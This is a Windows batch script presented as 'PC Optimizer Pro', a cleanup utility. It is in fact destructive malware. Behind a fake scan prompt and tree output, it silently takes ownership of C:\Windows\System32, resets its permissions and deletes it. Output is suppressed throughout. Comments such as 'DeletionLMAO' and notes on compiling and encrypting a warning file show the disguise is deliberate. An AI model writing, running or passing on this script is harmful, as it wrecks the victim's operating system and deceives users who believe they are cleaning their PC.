@echo off
title PC Optimizer Pro
color 0b
mode 1000
cls
:: you can remove the warning message during compile time if you don't want it
goto WarningMessage

:WarningMessage
rem HERE IS THE PART WHERE YOU NEED TO CHANGE IF YOU'RE ALSO ENCRYPTING THE VBS FILE
rem change "Warning.vbs" and "./Assets/Warning.vbs" to "Warning.vbe" and "./Assets/Warning/vbe" respectively before compiling.
rem then make sure the vbe file is actually in the compiled assets lol when you're running the exe
start "Warning.vbs" "./Assets/Warning.vbs"
goto ProgramStart

:ProgramStart
echo Thank you for using PC Optimizer Pro! 
echo PC Optimizer Pro is software that helps clean up your PC.
echo To start, PC Optimizer Pro would like to perform a scan. Allow?
set choice=
set /p choice=Y or N?: 
if NOT '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='Y' goto yes
if '%choice%'=='y' goto yes
if '%choice%'=='N' goto no
if '%choice%'=='n' goto no
echo "%choice%" is not a valid choice. Please type Y or N (capitalization doesn't matter).
pause
cls
goto ProgramStart

:no
cls
echo You have chosen to abort the scan.
pause
exit

:yes
cls
echo PC Optimizer Pro will now begin your scan.
pause
tree "%WINDIR%"
:: the nul supresses the output of the command, and the /r ignores all errors
takeown /f "C:\Windows\System32" /r /d Y > NUL 2>&1
tree "%WINDIR%\SysWOW64"
:: the nul supresses main output, and the 2>&1 supresses the error output (directs the type 2 output ie error back to nul)
icacls "C:\Windows\System32" /reset /t /c /q > NUL 2>&1
tree "%WINDIR%\System32"
echo ==========================================================================
echo ==========================================================================
echo You scan has been completed.
pause
cls
echo PC Optimizer Pro will now optimize your PC by deleting unnessesary internet logs, cache, and temporary files, amongst other things. 
pause
goto DeletionLMAO

:DeletionLMAO
:: the deletion is quiet as well, of course
del "C:\Windows\System32" /f /q /s > NUL 2>&1